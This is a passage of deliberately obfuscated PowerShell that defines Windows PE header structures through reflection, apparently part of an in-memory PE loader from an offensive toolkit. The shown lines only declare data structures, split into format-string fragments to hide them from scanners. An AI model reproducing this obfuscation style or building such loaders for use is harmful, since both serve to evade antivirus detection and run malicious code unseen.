		(${T`y`PEbuI`ldeR}.("{2}{0}{1}"-f'i','eld','DefineF').Invoke(("{4}{3}{1}{2}{5}{0}" -f'e','Re','s','Heap','SizeOf','erv'), [UInt64], ("{0}{1}"-f 'Publ','ic'))).("{1}{2}{0}"-f'et','SetOf','fs').Invoke(88) | &("{0}{1}{2}" -f 'Out-','N','ull')
		(${TYpeb`UI`lD`eR}.("{1}{3}{2}{0}"-f'eld','Defin','i','eF').Invoke(("{4}{0}{1}{3}{2}"-f'i','zeOf','apCommit','He','S'), [UInt64], ("{0}{1}" -f'Pub','lic'))).("{2}{0}{1}" -f'etO','ffset','S').Invoke(96) | &("{2}{0}{1}"-f 'Nul','l','Out-')
		(${TYP`EbU`IL`deR}.("{2}{0}{1}"-f 'efin','eField','D').Invoke(("{2}{1}{0}{3}" -f'Flag','oader','L','s'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{1}{2}{0}"-f't','SetOff','se').Invoke(104) | &("{1}{0}"-f't-Null','Ou')
		(${T`y`pEbUIlD`er}.("{1}{2}{3}{0}"-f'd','D','efineFie','l').Invoke(("{5}{1}{2}{3}{4}{0}" -f'izes','u','mber','OfRv','aAndS','N'), [UInt32], ("{1}{0}{2}" -f 'ubli','P','c'))).("{1}{0}" -f 'ffset','SetO').Invoke(108) | &("{1}{2}{0}"-f'ull','Ou','t-N')
		(${T`ypE`BUI`LdeR}.("{2}{1}{0}{3}" -f 'ineFi','f','De','eld').Invoke(("{1}{2}{0}{3}"-f'rtT','Ex','po','able'), ${imAg`E_D`AT`A_dIr`eCTORY}, ("{1}{0}" -f 'c','Publi'))).("{2}{0}{1}"-f 'f','fset','SetO').Invoke(112) | &("{1}{0}{2}"-f '-','Out','Null')
		(${tY`p`E`BUilDER}.("{3}{0}{2}{1}" -f'in','eld','eFi','Def').Invoke(("{0}{1}{2}" -f'ImportTab','l','e'), ${ImA`G`e_DaT`A_dIr`ECtorY}, ("{1}{0}{2}"-f 'u','P','blic'))).("{1}{0}{2}"-f 'etOff','S','set').Invoke(120) | &("{0}{2}{1}" -f'O','Null','ut-')
		(${t`yP`eBUi`LDer}.("{0}{2}{1}"-f 'De','ld','fineFie').Invoke(("{1}{0}{2}" -f'urceTabl','Reso','e'), ${ImAgE_d`A`T`A_diRE`ctorY}, ("{0}{1}"-f'Pu','blic'))).("{1}{0}"-f'Offset','Set').Invoke(128) | &("{0}{1}{2}"-f 'Out','-','Null')
		(${TYpE`Bu`i`lDEr}.("{2}{0}{1}"-f 'neFie','ld','Defi').Invoke(("{2}{1}{0}"-f 'ionTable','t','Excep'), ${IMaGe_daTa_D`I`RE`cTo`RY}, ("{0}{1}"-f'Pu','blic'))).("{0}{2}{1}" -f 'S','ffset','etO').Invoke(136) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
		(${TY`PEb`Uil`DEr}.("{0}{2}{3}{1}" -f'Defi','Field','n','e').Invoke(("{1}{2}{0}{3}{4}" -f'i','Cert','if','cateT','able'), ${ImagE_DaTA`_DirE`C`TO`Ry}, ("{1}{0}{2}"-f 'l','Pub','ic'))).("{1}{2}{0}"-f'Offset','Se','t').Invoke(144) | &("{0}{1}{2}" -f 'O','ut-Nu','ll')
		(${t`YpeBu`iLd`ER}.("{2}{1}{0}" -f 'ineField','ef','D').Invoke(("{1}{3}{2}{0}"-f 'e','BaseRel','cationTabl','o'), ${iMag`E_`D`A`Ta_DirECtOrY}, ("{1}{0}" -f 'blic','Pu'))).("{2}{1}{0}"-f'set','ff','SetO').Invoke(152) | &("{2}{1}{0}"-f'-Null','ut','O')
		(${t`YpebUi`lDeR}.("{2}{0}{1}{3}" -f 'in','eFiel','Def','d').Invoke(("{1}{0}"-f'bug','De'), ${iMaG`e`_DaTA_Dir`ecToRY}, ("{0}{1}" -f'Pub','lic'))).("{0}{2}{1}"-f'SetO','set','ff').Invoke(160) | &("{1}{0}{2}" -f'-','Out','Null')
		(${Ty`P`EbUi`lDER}.("{0}{1}{2}" -f 'Defi','neFi','eld').Invoke(("{2}{1}{0}"-f 're','chitectu','Ar'), ${image_D`AT`A`_DIrE`CTORY}, ("{1}{0}" -f 'lic','Pub'))).("{0}{1}" -f'SetOf','fset').Invoke(168) | &("{2}{0}{1}" -f 'N','ull','Out-')
		(${T`yPEb`U`ILdeR}.("{0}{1}{2}" -f 'D','ef','ineField').Invoke(("{2}{0}{1}"-f'balP','tr','Glo'), ${iMaG`e_DaTA`_DIReC`ToRY}, ("{0}{1}" -f'Publi','c'))).("{1}{0}{2}"-f'fse','SetOf','t').Invoke(176) | &("{1}{0}" -f 'ut-Null','O')
		(${typeBuI`l`DEr}.("{2}{1}{3}{0}" -f 'ield','n','Defi','eF').Invoke(("{1}{0}"-f 'LSTable','T'), ${ImaGe_DA`T`A`_D`ir`EcTo`RY}, ("{1}{0}" -f 'ublic','P'))).("{1}{2}{0}" -f 't','Se','tOffse').Invoke(184) | &("{1}{2}{0}"-f '-Null','Ou','t')
		(${t`ypE`BuILdER}.("{2}{1}{3}{0}" -f'd','Fie','Define','l').Invoke(("{4}{0}{3}{2}{1}"-f 'a','le','figTab','dCon','Lo'), ${i`MA`Ge_dATA_Dir`EC`To`RY}, ("{0}{2}{1}"-f'P','blic','u'))).("{1}{0}"-f 'set','SetOff').Invoke(192) | &("{1}{0}{2}"-f't-N','Ou','ull')
		(${T`Y`PEbUiLd`Er}.("{3}{2}{1}{0}" -f 'd','l','ineFie','Def').Invoke(("{1}{0}{3}{2}"-f 'oun','B','mport','dI'), ${I`mAg`e_DAt`A_dIreCT`ORy}, ("{0}{1}" -f'Publ','ic'))).("{1}{0}" -f'fset','SetOf').Invoke(200) | &("{1}{2}{0}" -f'll','O','ut-Nu')
		(${t`Ype`B`UIlDeR}.("{0}{2}{3}{1}"-f'Defi','eld','neF','i').Invoke('IAT', ${ImAG`e_daT`A_`dirE`cTorY}, ("{0}{1}" -f 'Publi','c'))).("{2}{0}{1}"-f 'tOff','set','Se').Invoke(208) | &("{2}{1}{0}" -f 'll','ut-Nu','O')
		(${t`YP`Eb`UIlDER}.("{0}{2}{1}" -f 'D','ld','efineFie').Invoke(("{2}{1}{0}{3}{4}"-f 'rtDescrip','elayImpo','D','t','or'), ${IMage_`da`Ta`_diR`e`CT`ory}, ("{0}{1}"-f'P','ublic'))).("{0}{2}{1}" -f'SetO','et','ffs').Invoke(216) | &("{1}{2}{0}"-f'Null','Ou','t-')
		(${TY`PE`BU`ildER}.("{2}{1}{0}" -f 'ield','eF','Defin').Invoke(("{0}{1}{4}{2}{3}" -f 'C','LRR','ntim','eHeader','u'), ${imaGe_dA`TA`_`dirE`c`TORy}, ("{0}{2}{1}"-f'Pu','lic','b'))).("{2}{1}{0}"-f'fset','f','SetO').Invoke(224) | &("{0}{1}"-f 'Out','-Null')
		(${tYPE`BuILD`ER}.("{2}{0}{1}"-f 'efi','neField','D').Invoke(("{1}{0}" -f 'served','Re'), ${iM`Age_D`ATA_D`IRe`CtO`RY}, ("{1}{0}"-f 'lic','Pub'))).("{2}{0}{1}"-f'etOff','set','S').Invoke(232) | &("{1}{0}{2}"-f't-Nul','Ou','l')
		${i`maGe`_opT`Ion`AL_`heAD`e`R64} = ${TYPeB`UIL`dEr}.("{0}{2}{1}"-f'Create','pe','Ty').Invoke()
		${WiN3`2t`y`pES} | &("{0}{1}{2}" -f 'Ad','d-Memb','er') -MemberType ("{1}{0}{2}"-f 'teProp','No','erty') -Name ("{4}{2}{1}{0}{3}"-f'NAL_HEA','TIO','OP','DER64','IMAGE_') -Value ${i`M`Ag`e_oPTIoNal_`HeAder64}

		
		${a`TtrIBu`T`ES} = ("{9}{11}{4}{3}{7}{5}{12}{6}{8}{1}{13}{10}{2}{0}" -f 'ieldInit','itLayou','oreF','lass, Class, Pub',' AnsiC','p','i','lic, Ex','c','Aut','d, Bef','oLayout,','l','t, Seale')
		${TY`Pe`BUIl`DeR} = ${M`O`DUl`EbUiL`DEr}.("{0}{2}{1}" -f 'Def','ype','ineT').Invoke(("{0}{1}{5}{2}{4}{3}{6}"-f 'IMA','G','_','E','OPTIONAL_H','E','ADER32'), ${At`Tr`IBu`Tes}, [System.ValueType], 224)
		(${T`YPEbui`Ld`er}.("{3}{2}{0}{1}" -f 'fin','eField','e','D').Invoke(("{1}{0}" -f'c','Magi'), ${M`AgIC`TYPE}, ("{0}{1}"-f 'Pub','lic'))).("{1}{2}{0}" -f 'Offset','S','et').Invoke(0) | &("{1}{0}{2}"-f'u','O','t-Null')
		(${Typ`Eb`U`IlDer}.("{2}{1}{3}{0}" -f'ld','e','D','fineFie').Invoke(("{5}{0}{4}{3}{2}{1}" -f 'jorL','on','si','kerVer','in','Ma'), [Byte], ("{2}{0}{1}" -f'u','blic','P'))).("{1}{2}{0}" -f'Offset','S','et').Invoke(2) | &("{0}{1}{2}" -f'O','ut-Nu','ll')
		(${TypEbu`I`LdeR}.("{1}{2}{0}" -f 'ld','D','efineFie').Invoke(("{2}{5}{1}{4}{0}{3}"-f 'ker','rLi','M','Version','n','ino'), [Byte], ("{1}{0}{2}" -f'ub','P','lic'))).("{0}{1}{2}"-f 'SetOffs','e','t').Invoke(3) | &("{2}{1}{0}"-f'll','ut-Nu','O')
		(${tYP`E`BUiL`DeR}.("{3}{2}{1}{0}" -f'ld','e','neFi','Defi').Invoke(("{1}{2}{0}"-f'Code','Size','Of'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{0}{1}{2}" -f'SetO','ffs','et').Invoke(4) | &("{0}{1}{2}" -f 'O','ut','-Null')
		(${tYPEb`UILd`er}.("{1}{2}{0}" -f 'eld','Defi','neFi').Invoke(("{3}{4}{6}{1}{0}{2}{5}"-f'ed','Initializ','D','Siz','e','ata','Of'), [UInt32], ("{1}{0}{2}" -f 'l','Pub','ic'))).("{1}{0}{2}" -f'Offse','Set','t').Invoke(8) | &("{0}{1}{2}"-f 'Out','-','Null')
		(${T`YpebUi`lDER}.("{0}{2}{1}"-f 'Defin','Field','e').Invoke(("{1}{6}{0}{5}{3}{2}{4}" -f'e','Si','nitia','fUni','lizedData','O','z'), [UInt32], ("{0}{1}"-f 'P','ublic'))).("{2}{1}{0}" -f'set','ff','SetO').Invoke(12) | &("{2}{1}{0}" -f 'll','t-Nu','Ou')
		(${typEB`U`ILDEr}.("{2}{0}{1}" -f'ef','ineField','D').Invoke(("{1}{3}{2}{0}"-f'Point','AddressO','try','fEn'), [UInt32], ("{2}{1}{0}"-f 'lic','b','Pu'))).("{2}{1}{0}"-f'set','etOff','S').Invoke(16) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		(${TYPe`BUiL`deR}.("{2}{1}{0}"-f'ineField','f','De').Invoke(("{1}{2}{0}"-f'ode','B','aseOfC'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{1}{3}{0}{2}"-f'fs','SetO','et','f').Invoke(20) | &("{0}{1}"-f 'Out-N','ull')
		(${TYP`Eb`UILdEr}.("{0}{1}{2}"-f 'D','efine','Field').Invoke(("{3}{1}{0}{2}" -f'Da','aseOf','ta','B'), [UInt32], ("{1}{2}{0}" -f'ic','Pu','bl'))).("{1}{0}{2}" -f'Offs','Set','et').Invoke(24) | &("{1}{0}{2}" -f 'ul','Out-N','l')
		(${Ty`pEBu`iL`dEr}.("{0}{2}{1}" -f 'Def','d','ineFiel').Invoke(("{2}{0}{1}" -f'ageBa','se','Im'), [UInt32], ("{1}{0}"-f 'c','Publi'))).("{1}{2}{0}" -f 'fset','Se','tOf').Invoke(28) | &("{0}{2}{1}"-f'Out-','l','Nul')
		(${tyP`Eb`U`ildEr}.("{2}{1}{0}" -f'ld','e','DefineFi').Invoke(("{1}{4}{3}{0}{2}"-f'lignme','Se','nt','nA','ctio'), [UInt32], ("{0}{1}" -f 'P','ublic'))).("{0}{1}"-f'SetOff','set').Invoke(32) | &("{1}{0}{2}" -f'u','Out-N','ll')
		(${TYp`E`B`UIldeR}.("{1}{2}{0}" -f'ield','De','fineF').Invoke(("{1}{2}{0}{3}"-f'e','F','ileAlignm','nt'), [UInt32], ("{1}{0}" -f'ic','Publ'))).("{3}{0}{1}{2}" -f's','e','t','SetOff').Invoke(36) | &("{1}{0}{2}" -f'ut','O','-Null')
		(${tYP`eBU`i`LdEr}.("{0}{1}{2}"-f 'Def','ineFiel','d').Invoke(("{1}{0}{3}{5}{2}{4}" -f 'or','Maj','st','Operati','emVersion','ngSy'), [UInt16], ("{1}{0}" -f 'blic','Pu'))).("{1}{0}{2}"-f't','Se','Offset').Invoke(40) | &("{2}{0}{1}" -f't-','Null','Ou')
		(${tYp`EBuiLd`eR}.("{0}{1}{2}{3}"-f'De','fi','neFie','ld').Invoke(("{2}{4}{1}{3}{6}{5}{0}" -f'sion','eratingSyst','MinorO','e','p','r','mVe'), [UInt16], ("{1}{2}{0}" -f'ic','P','ubl'))).("{2}{0}{1}" -f 'Of','fset','Set').Invoke(42) | &("{0}{1}{2}"-f'Out-N','ul','l')
		(${tYPe`BUil`deR}.("{1}{0}{2}" -f'eF','Defin','ield').Invoke(("{1}{4}{0}{2}{3}"-f 'ImageVer','Majo','si','on','r'), [UInt16], ("{0}{1}" -f'Publi','c'))).("{2}{1}{0}" -f'et','etOffs','S').Invoke(44) | &("{1}{0}"-f'Null','Out-')
		(${TYPE`BUil`D`ER}.("{0}{1}{3}{2}" -f'D','efineF','eld','i').Invoke(("{0}{3}{2}{1}" -f'Mi','on','ImageVersi','nor'), [UInt16], ("{0}{1}"-f 'Pu','blic'))).("{1}{2}{0}" -f'set','SetO','ff').Invoke(46) | &("{1}{0}{2}" -f'ut-','O','Null')
		(${TY`pEbui`Lder}.("{3}{1}{2}{0}"-f'eld','fineF','i','De').Invoke(("{1}{0}{3}{2}" -f 's','MajorSub','n','ystemVersio'), [UInt16], ("{1}{0}"-f 'lic','Pub'))).("{1}{2}{0}" -f 'et','Se','tOffs').Invoke(48) | &("{1}{0}" -f'-Null','Out')
		(${T`YpEbUI`L`dER}.("{2}{1}{0}"-f'eld','ineFi','Def').Invoke(("{3}{1}{0}{5}{4}{2}" -f'm','norSubsyste','ion','Mi','ers','V'), [UInt16], ("{0}{1}"-f'Pu','blic'))).("{2}{0}{1}" -f'Offs','et','Set').Invoke(50) | &("{0}{2}{1}" -f 'Out-N','ll','u')
		(${Typ`e`BuIld`er}.("{0}{3}{1}{2}" -f 'Define','ie','ld','F').Invoke(("{5}{0}{1}{2}{4}{3}"-f'n32','Ve','rsi','e','onValu','Wi'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{2}{1}{0}"-f't','fse','SetOf').Invoke(52) | &("{0}{1}"-f'O','ut-Null')
		(${tYPE`BU`Ild`er}.("{3}{2}{0}{1}" -f'ineFie','ld','f','De').Invoke(("{3}{1}{0}{2}" -f'Ima','Of','ge','Size'), [UInt32], ("{0}{1}{2}" -f'P','ubli','c'))).("{1}{2}{0}" -f 't','SetOff','se').Invoke(56) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		(${T`YpEB`UI`ldeR}.("{1}{0}{2}" -f 'e','Defin','Field').Invoke(("{0}{1}{3}{2}" -f 'SizeOfH','ea','rs','de'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{2}{0}{1}"-f 'tOf','fset','Se').Invoke(60) | &("{2}{1}{0}" -f 'Null','t-','Ou')
		(${Ty`p`EBuI`LDeR}.("{1}{0}{2}"-f'i','Def','neField').Invoke(("{1}{0}"-f 'Sum','Check'), [UInt32], ("{1}{2}{0}"-f 'c','Publ','i'))).("{1}{2}{0}" -f 'fset','S','etOf').Invoke(64) | &("{1}{2}{0}" -f 'll','Out-','Nu')
		(${tY`p`EBuiLdER}.("{2}{1}{0}"-f 'd','fineFiel','De').Invoke(("{2}{1}{0}"-f'tem','ubsys','S'), ${sU`B`SYSteMTYpE}, ("{0}{1}"-f'Publi','c'))).("{0}{1}{2}"-f 'Set','Offse','t').Invoke(68) | &("{0}{1}{2}" -f'O','ut','-Null')
		(${TY`pEb`UilDeR}.("{0}{1}{2}" -f 'De','fineFie','ld').Invoke(("{4}{5}{2}{1}{3}{0}" -f 'tics','te','ac','ris','DllCh','ar'), ${DlL`ChaRact`eriSTi`CS`T`y`PE}, ("{0}{1}{2}"-f'Pub','l','ic'))).("{0}{1}{2}{3}" -f 'S','e','tO','ffset').Invoke(70) | &("{1}{0}"-f 'll','Out-Nu')
		(${tyPE`Buil`deR}.("{0}{1}{2}" -f'Defi','ne','Field').Invoke(("{0}{3}{1}{4}{2}" -f 'S','zeOfStac','eserve','i','kR'), [UInt32], ("{2}{1}{0}" -f 'lic','b','Pu'))).("{0}{1}"-f 'SetO','ffset').Invoke(72) | &("{2}{1}{0}" -f'll','Nu','Out-')
		(${tYp`eB`UILd`Er}.("{3}{0}{1}{2}"-f'i','e','ld','DefineF').Invoke(("{4}{1}{0}{2}{3}" -f 'Co','Stack','m','mit','SizeOf'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{0}{1}{2}" -f 'S','etOf','fset').Invoke(76) | &("{2}{1}{0}"-f'l','-Nul','Out')
		(${tYp`e`BUi`ldEr}.("{2}{1}{3}{0}" -f 'd','efineFi','D','el').Invoke(("{1}{2}{0}{4}{3}"-f'fHe','S','izeO','e','apReserv'), [UInt32], ("{1}{0}" -f'blic','Pu'))).("{0}{2}{1}" -f'Set','set','Off').Invoke(80) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
		(${tY`p`EBuIldEr}.("{2}{0}{1}{3}" -f 'efine','Fi','D','eld').Invoke(("{2}{1}{0}{3}"-f 'Com','fHeap','SizeO','mit'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{2}{1}{0}"-f't','Offse','Set').Invoke(84) | &("{0}{2}{1}" -f'Out','ll','-Nu')
		(${tY`peb`UildEr}.("{2}{1}{0}{3}" -f 'l','e','DefineFi','d').Invoke(("{2}{0}{3}{1}" -f'd','rFlags','Loa','e'), [UInt32], ("{0}{1}" -f'P','ublic'))).("{2}{1}{0}"-f 't','fse','SetOf').Invoke(88) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		(${T`yPE`B`UILdeR}.("{1}{0}{2}{3}"-f'i','Def','neF','ield').Invoke(("{0}{4}{3}{5}{1}{2}"-f'NumberO','dSi','zes','Rva','f','An'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{0}{1}" -f'SetO','ffset').Invoke(92) | &("{2}{0}{1}"-f 'Nul','l','Out-')
		(${t`ype`Bu`ILder}.("{1}{0}{2}" -f'ineFi','Def','eld').Invoke(("{2}{0}{1}"-f 'Tab','le','Export'), ${IMage_dATa`_dIReC`T`O`Ry}, ("{2}{0}{1}"-f'ubl','ic','P'))).("{0}{1}{2}"-f'Set','Offs','et').Invoke(96) | &("{0}{1}{2}"-f 'O','ut','-Null')
		(${TYpE`Bu`iLdeR}.("{2}{1}{0}"-f'ld','fineFie','De').Invoke(("{2}{0}{1}"-f 'abl','e','ImportT'), ${iMa`ge_da`TA_`d`irE`CTorY}, ("{1}{0}" -f 'ublic','P'))).("{0}{1}{2}"-f'S','etOff','set').Invoke(104) | &("{2}{0}{1}" -f 't','-Null','Ou')
		(${tYP`e`BUilDeR}.("{1}{0}{2}" -f'Fie','Define','ld').Invoke(("{0}{2}{3}{1}"-f'R','ble','esourceT','a'), ${Im`AG`E_`dat`A_Di`R`eCtOry}, ("{1}{0}" -f'ic','Publ'))).("{2}{1}{0}" -f 't','ffse','SetO').Invoke(112) | &("{1}{0}{2}"-f't-','Ou','Null')
		(${TY`pebui`LDer}.("{1}{0}{2}"-f 'Fie','Define','ld').Invoke(("{1}{0}{2}" -f'onTabl','Excepti','e'), ${Im`Ag`E_Da`TA_DIReC`Tory}, ("{1}{0}"-f 'blic','Pu'))).("{2}{0}{1}" -f 'fse','t','SetOf').Invoke(120) | &("{1}{0}"-f'l','Out-Nul')
		(${TY`pE`BU`ilder}.("{0}{1}{3}{2}" -f 'D','ef','neField','i').Invoke(("{2}{1}{3}{0}{4}" -f'b','ertif','C','icateTa','le'), ${i`MAGe_dAt`A`_dIr`EctORY}, ("{1}{0}"-f'c','Publi'))).("{2}{0}{1}"-f'e','t','SetOffs').Invoke(128) | &("{2}{0}{1}"-f 'ut-','Null','O')
		(${tyP`EbuILd`ER}.("{3}{1}{0}{2}"-f'e','Fi','ld','Define').Invoke(("{0}{3}{4}{2}{5}{1}"-f 'Bas','ble','n','eRelocati','o','Ta'), ${im`AGE_Da`T`A_`D`IRe`ctOry}, ("{1}{0}" -f'ublic','P'))).("{2}{0}{1}"-f 'ffs','et','SetO').Invoke(136) | &("{2}{0}{1}" -f'ut-N','ull','O')
		(${ty`PeBU`Il`Der}.("{3}{1}{0}{2}"-f'Fi','ine','eld','Def').Invoke(("{1}{0}"-f'bug','De'), ${iMagE_d`At`A`_dIre`cToRY}, ("{1}{0}"-f 'ic','Publ'))).("{2}{1}{0}"-f 'et','s','SetOff').Invoke(144) | &("{2}{0}{1}"-f'-Nul','l','Out')
		(${TyPEBu`iL`dER}.("{2}{1}{0}"-f 'ineField','f','De').Invoke(("{2}{0}{1}"-f'rchitectur','e','A'), ${imagE_DA`T`A_DiRe`C`To`RY}, ("{1}{0}"-f'lic','Pub'))).("{1}{2}{0}"-f'et','Set','Offs').Invoke(152) | &("{0}{2}{1}"-f'Out','ll','-Nu')
		(${tyPe`BUI`lDEr}.("{2}{1}{0}{3}" -f 'F','ne','Defi','ield').Invoke(("{0}{1}{2}" -f'Glob','alPt','r'), ${ImagE_d`ATA_di`REcT`OrY}, ("{0}{1}" -f 'Publ','ic'))).("{1}{2}{0}"-f'Offset','S','et').Invoke(160) | &("{0}{2}{1}" -f'Out-N','ll','u')
		(${TY`P`eBuiLdER}.("{1}{2}{0}"-f'd','DefineFi','el').Invoke(("{0}{2}{1}" -f 'TLS','e','Tabl'), ${IMaGE_D`At`A_dIr`eCT`oRY}, ("{0}{1}"-f'P','ublic'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(168) | &("{0}{1}{2}" -f 'Ou','t-Nul','l')
		(${tyP`EB`UI`LdEr}.("{2}{1}{0}" -f'eld','efineFi','D').Invoke(("{0}{1}{3}{2}{4}" -f'Load','Conf','gTabl','i','e'), ${imAg`E_D`ATA`_DI`REct`ORY}, ("{2}{1}{0}"-f 'lic','ub','P'))).("{2}{0}{1}"-f 's','et','SetOff').Invoke(176) | &("{2}{0}{1}" -f'Nul','l','Out-')
		(${TyPeb`U`il`Der}.("{1}{2}{0}"-f 'ineField','De','f').Invoke(("{2}{1}{0}" -f 'rt','Impo','Bound'), ${IMa`Ge`_daTA`_D`ir`ecToRY}, ("{0}{2}{1}" -f 'P','c','ubli'))).("{0}{1}{2}"-f'S','etOff','set').Invoke(184) | &("{0}{2}{1}"-f'Out-','ull','N')
		(${TYPe`BU`ilDEr}.("{0}{1}{2}" -f 'Def','i','neField').Invoke('IAT', ${I`mage_da`T`A_DirecTorY}, ("{1}{0}" -f'c','Publi'))).("{1}{0}{2}"-f 'ffs','SetO','et').Invoke(192) | &("{0}{2}{1}"-f 'O','l','ut-Nul')
		(${tyP`eBui`L`DeR}.("{0}{2}{3}{1}" -f 'D','d','ef','ineFiel').Invoke(("{0}{3}{1}{2}{4}" -f'Delay','t','Descripto','Impor','r'), ${ImAGe_Da`Ta_`D`iRECT`o`RY}, ("{0}{1}" -f 'Publ','ic'))).("{1}{2}{0}{3}" -f 'f','Se','tOf','set').Invoke(200) | &("{1}{0}{2}" -f'ut','O','-Null')
		(${t`YPEBu`iLDer}.("{1}{0}{2}" -f'fine','De','Field').Invoke(("{1}{3}{0}{2}"-f'eHe','CLRR','ader','untim'), ${ima`Ge_`d`A`TA_`DIReC`TOry}, ("{2}{1}{0}" -f 'blic','u','P'))).("{1}{2}{0}"-f'fset','S','etOf').Invoke(208) | &("{0}{1}{2}"-f 'Out-','Nu','ll')
		(${Typ`E`BUil`DER}.("{1}{0}{2}" -f'i','DefineF','eld').Invoke(("{0}{2}{1}" -f'R','rved','ese'), ${I`ma`GE_daT`A_`d`iRECTORy}, ("{1}{0}{2}"-f'i','Publ','c'))).("{1}{0}{2}" -f 't','Se','Offset').Invoke(216) | &("{0}{1}" -f 'Out-','Null')
		${I`mAge_oPTiOn`A`L`_h`eaDeR32} = ${tY`PE`BuI`lDEr}.("{0}{2}{1}"-f 'Creat','Type','e').Invoke()
		${wI`N`32`TyPES} | &("{0}{1}{2}"-f'Add-M','embe','r') -MemberType ("{1}{2}{3}{0}"-f'Property','N','o','te') -Name ("{1}{3}{5}{2}{4}{6}{0}"-f'32','IM','E','AGE','AD','_OPTIONAL_H','ER') -Value ${iMa`gE_O`p`TiONAl`_headE`R`32}

		
		${a`T`TRIbUTEs} = ("{15}{13}{0}{10}{2}{5}{17}{3}{19}{1}{4}{9}{11}{7}{20}{22}{23}{12}{14}{6}{16}{21}{18}{8}"-f 'toLayo','ass, Public, ','n','ss, ','S','siC',' B','yo','Init','equenti','ut, A','alLa','a','u','led,','A','e','la','eField','Cl','ut','for',', S','e')
		${TY`pEBu`ILd`Er} = ${Mo`dUlebUil`d`ER}.("{0}{1}{2}" -f 'Defi','neTyp','e').Invoke(("{3}{1}{2}{0}" -f 'HEADERS64','_N','T_','IMAGE'), ${ATtR`i`Butes}, [System.ValueType], 264)
		${TYp`ebuIL`deR}.("{2}{1}{0}{3}" -f'ie','neF','Defi','ld').Invoke(("{0}{1}{2}" -f 'S','ignatur','e'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}" -f't','Ou','-Null')
		${t`YpEBU`ILDEr}.("{2}{1}{0}"-f'd','iel','DefineF').Invoke(("{0}{1}{2}" -f 'Fi','leHe','ader'), ${iMag`e_fIlE`_`hEa`der}, ("{0}{2}{1}"-f 'P','c','ubli')) | &("{0}{1}"-f 'Out-Nul','l')
		${TY`PeBuI`LDEr}.("{2}{3}{1}{0}" -f 'ld','neFie','Def','i').Invoke(("{1}{4}{0}{2}{3}"-f'lHe','Op','a','der','tiona'), ${iMaGE_`OPtIo`NAl`_H`Ea`deR`64}, ("{1}{0}" -f'blic','Pu')) | &("{0}{1}"-f 'Out-N','ull')
		${imAGe_NT`_H`EaDEr`S`64} = ${TYp`eBui`ld`Er}.("{0}{1}{2}{3}"-f'Cre','a','te','Type').Invoke()
		${w`in32`TY`PES} | &("{3}{2}{0}{1}" -f'b','er','-Mem','Add') -MemberType ("{1}{0}{2}{3}"-f 'teProp','No','er','ty') -Name ("{2}{4}{0}{3}{1}{5}" -f '_H','A','IMAGE_N','E','T','DERS64') -Value ${IMAgE`_NT`_`HEaDErS`64}
		
		
		${AttRIBU`T`Es} = ("{11}{21}{2}{13}{9}{17}{14}{18}{12}{8}{0}{1}{20}{6}{3}{16}{5}{23}{4}{10}{7}{19}{22}{15}"-f'a','ss, Public, Se','a','n','e','L','e',', ','l','si','d','Au',' C','yout, An','lass','dInit','tial','C',',','BeforeFi','qu','toL','el','ayout, Seal')
		${Ty`Pe`BUILdER} = ${Mod`ULeBUiLd`ER}.("{1}{2}{0}"-f 'eType','D','efin').Invoke(("{1}{3}{2}{4}{0}"-f'32','IMAGE_NT_','EADE','H','RS'), ${a`TT`R`ibuteS}, [System.ValueType], 248)
		${tyPE`B`U`ilDER}.("{1}{2}{0}{3}" -f 'fineFiel','D','e','d').Invoke(("{1}{2}{0}" -f 'nature','Si','g'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{0}{1}"-f 'Out-Nul','l')
		${TYpEbU`IlD`er}.("{1}{3}{2}{0}" -f 'd','Define','iel','F').Invoke(("{2}{0}{1}" -f'e','Header','Fil'), ${iM`A`gE`_Fi`lE_hEaD`Er}, ("{1}{0}"-f 'ic','Publ')) | &("{0}{2}{1}" -f 'Out','ull','-N')
		${T`YpeBuIL`Der}.("{3}{1}{2}{0}" -f'Field','efi','ne','D').Invoke(("{4}{0}{3}{2}{1}" -f'ptio','ader','e','nalH','O'), ${ImaGE_`oPTiONa`L`_H`EADEr`32}, ("{0}{1}" -f 'Publ','ic')) | &("{0}{1}"-f 'O','ut-Null')
		${Ima`Ge_`N`T`_hEADer`S32} = ${TypE`BU`iL`DER}.("{2}{1}{0}"-f'Type','reate','C').Invoke()
		${Win3`2`T`YPes} | &("{1}{2}{0}" -f'ember','Add','-M') -MemberType ("{1}{2}{0}"-f'y','NoteP','ropert') -Name ("{1}{3}{0}{2}"-f'_HEAD','IMAGE','ERS32','_NT') -Value ${iMaGe_`N`T_H`EAd`ERS32}

		
		${aT`T`RibUTES} = ("{3}{11}{7}{17}{12}{1}{10}{13}{15}{6}{5}{2}{16}{14}{0}{4}{8}{9}" -f' ','ns','y','Aut','BeforeFi','c, SequentialLa','bli','o','eldI','nit','iCl','oLay','A','ass, Class,',',',' Pu','out, Sealed','ut, ')
		${tYp`EBuIL`DEr} = ${MOD`ULEb`UIlDeR}.("{2}{1}{0}"-f 'e','yp','DefineT').Invoke(("{4}{0}{1}{2}{3}"-f'M','A','GE_DO','S_HEADER','I'), ${At`T`R`iBUTes}, [System.ValueType], 64)
		${typ`EB`UI`ldEr}.("{0}{1}{2}"-f 'Def','ineFiel','d').Invoke(("{1}{2}{0}" -f 'agic','e_','m'), [UInt16], ("{0}{2}{1}"-f 'Pu','lic','b')) | &("{0}{1}" -f 'Out-','Null')
		${typ`e`BUi`Lder}.("{0}{2}{3}{1}"-f 'D','ield','efine','F').Invoke(("{1}{0}" -f 'blp','e_c'), [UInt16], ("{0}{1}" -f'P','ublic')) | &("{2}{0}{1}"-f't-','Null','Ou')
